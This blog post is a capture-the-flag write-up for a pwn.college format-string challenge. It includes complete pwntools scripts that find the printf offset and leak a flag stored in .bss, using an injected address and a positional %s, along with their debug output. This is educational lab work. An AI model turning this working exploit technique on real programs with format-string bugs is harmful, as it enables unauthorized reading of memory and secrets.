---
title: "The BSS Leak"
description: ""
author: "İsmail BOZKURT"
date: 2025-08-19
tags:
  - binary-exploitation
  - format-string-attack
  - pwn
  - CTF
categories:
  - Exploitation
  - Pwn
  - Format-String-Attack
---

## Format String Attack - The Leak from BSS

Hey there, hope you are good. This variant doesn't much different from previous [The-Stack-Leak-2](/Dreamer-Wiki/Pwn/Linux/Format%20String%20Vulnerabilities/03-Format-String-Attack-The-Stack-Leak-2/).
Same approach, only difference the flag lies somewhere in BSS.

Like previous ones the address of **flag** exposed by the challenge. So only difference the getting address phase, rest is same as previous one.

```perl
> ./babyfmt_level3.0 
###
### Welcome to ./babyfmt_level3.0!
###

This challenge reads in some bytes, calls printf on that string, and allows you to perform
a format string attack. Through this series of challenges, you will become painfully familiar
with the concept of Format String Attacks!

This challenge allows you to make a 256-sized format string.

This challenge reads the flag into the .bss! Nice and easy; just read it out!

So, the flag is in the .bss. How are you going to get it?
One way to do it is to use %s in your format string. It will dereference a pointer
and print the string that the pointer is pointing to. This is perfect for leaking the
flag from the BSS!

But there's one problem... Unlike level 1, you don't have a pointer to the bss on the stack.
The solution? Write this address in as part of your format string, then use a positional %s (i.e.,
%X$s with the correct X) to use that address as the pointer. That way, you have full control of
the address!

In this case, the address you want is 0x404140. Remember to input it in little endian! To debug what
address your %s will dereference, you can replace 's' with 'x' and see what the address is
being interpreted at.

I will now read up to 256 bytes. Send your data!
asd
Received 4 bytes!

I will now call printf on your data!

asd

### Goodbye!
```



**find_offset_and_padlen.py**

```python
from pwn import *

# Load binary and configure context
elf = context.binary = ELF('./babyfmt_level3.0', checksec=False)
context.log_level = 'debug'

gdbscript = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gdbscript)
    return process([elf.path])

#### send helper ####
def send_fmt(payload):
    io = start()
    try:
        io.sendafter(b'Send your data!\n', payload)
        data = io.recvall(timeout=0.01)
        return data
    finally:
        io.close()

f = FmtStr(send_fmt)

success(f'User input starts at  : {f.offset}')
success(f'Needed pads           :{f.padlen}')
success(f'Numbwritten           :{f.numbwritten}')
```

**The result:**

```python
[DEBUG] Received 0x76 bytes:
    b'Received 33 bytes!\n'
    b'\n'
    b'I will now call printf on your data!\n'
    b'\n'
    b'aaaabaaacaaadaaaeaaaSTART0x6161616361616162END\n'
    b'### Goodbye!\n'
[*] Found format string offset: 27
[+] User input starts at  : 27
[+] Needed pads           :4
[+] Numbwritten           :0
```

## get_flag

If you are new about pwntools, i settled **context.log_level='debug'**, so you can understand how address extracted. You can use regex also to do get the address. How lazy i am you have no idea.

**get_flag.py**

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babyfmt_level3.0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './babyfmt_level3.0')
context.log_level = 'debug'
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No


def build_payload(fmt: bytes, addrs: list[int], padlen: int, filler: bytes = b"|") -> bytes:
    ptrsz = context.bytes
    layout = { padlen: fmt }
    for i, a in enumerate(addrs):
        off = padlen + 16 + i*ptrsz
        layout[off] = p64(a) if ptrsz == 8 else p32(a)
    return fit(layout, filler=filler)

def minileak(leak):
    try:
        leak = re.findall(br"START(.*?)END", leak, re.MULTILINE | re.DOTALL)[0]
    except ValueError:
        leak = 0
    return leak

io = start()


##### Get BSS Address from Text #####
io.recvuntil(b'the address!\n\n')
bss_addr = int(io.recvline().strip().split(b' ')[8][:-1], 16)
info(f'BSS Address: {bss_addr:#x}')

##### Build Payload with the known offset and padlen #####
offset = 27
padlen = 4

fmt = f'START%%%d$sEND' % (offset+16//context.bytes)
payload = build_payload(fmt, [bss_addr], padlen=padlen)
io.sendafter(b'Send your data!\n', payload)

try:
    leak = io.recv()
    flag = minileak(leak).strip()
    io.critical(f'FLAG: {flag}')
except:
    error("Couldn't hack it")
finally:
    io.close()
```

**The result:**

```python
root@e2cb00cfcebe:/host# python3 exploit.py 
[*] '/host/babyfmt_level3.0'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process '/host/babyfmt_level3.0': pid 190
[*] BSS Address: 0x404140
/host/exploit.py:54: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  return fit(layout, filler=filler)
[CRITICAL] FLAG: b'pwn.college{IL-**************************************MzEzW}'
[*] Process '/host/babyfmt_level3.0' stopped with exit code 0 (pid 190)
```

## References 

- [man7 — printf(3) (POSIX-style positional args, `*m$`, `%n`)](https://man7.org/linux/man-pages/man3/printf.3.html)
- [The Open Group — `fprintf()` (rule: don’t mix numbered & unnumbered specs)](https://pubs.opengroup.org/onlinepubs/009604499/functions/fprintf.html)
- [Linux die.net — printf(3) overview](https://linux.die.net/man/3/printf)
- [cppreference — `fprintf` family (width/precision basics)](https://en.cppreference.com/w/c/io/fprintf.html)
- [GNU C Library Manual (HTML) — libc reference](https://www.gnu.org/s/libc/manual/html_mono/libc.html)
- [GNU C Library Manual (PDF)](https://www.gnu.org/software/libc/manual/pdf/libc.pdf)
- [Stack Overflow — How positional args like `%1$` work (with POSIX quote)](https://stackoverflow.com/a/6322594/923794)
- [Stack Overflow — Meaning of `%m` (GNU extension)](https://stackoverflow.com/questions/20577557/whats-the-meaning-of-the-m-formatting-specifier)
- [CERT C — FIO30-C: Exclude user input from format strings](https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C.%2BExclude%2Buser%2Binput%2Bfrom%2Bformat%2Bstrings)
- [OWASP — Format string attack](https://owasp.org/www-community/attacks/Format_string_attack)
- [OWASP WSTG — Testing for Format String Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection)
- [MITRE CWE-134 — Use of Externally-Controlled Format String](https://cwe.mitre.org/data/definitions/134.html)
- [Classic paper — “Exploiting Format String Vulnerabilities” (scut/Team TESO)](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
- [CTF 101 — Format String Vulnerability (intro)](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)
- [pwn.college — Format String Exploits](https://pwn.college/software-exploitation/format-string-exploits)
- [CTF Cookbook — printf Leak](https://ctfcookbook.com/docs/pwn/printf-leak/)
- [Pwntools — `pwnlib.fmtstr` (FmtStr helper)](https://docs.pwntools.com/en/stable/fmtstr.html)
- [Pwntools — `pwnlib.util.packing.fit` / `flat`](https://docs.pwntools.com/en/stable/util/packing.html)
- [Pwntools — `context` settings (`context.binary`, `context.log_level`)](https://docs.pwntools.com/en/stable/context.html)
- [Pwntools — tubes (I/O helpers like `sendafter`, `recvuntil`)](https://docs.pwntools.com/en/stable/tubes.html)
- [Wikipedia — `.bss` section (what it is)](https://en.wikipedia.org/wiki/.bss)
- [LSB Refspec — ELF Special Sections (`.bss`)](https://refspecs.linuxfoundation.org/LSB_1.1.0/gLSB/specialsections.html)
- [Wikipedia — Endianness (little-endian reminder)](https://en.wikipedia.org/wiki/Endianness)
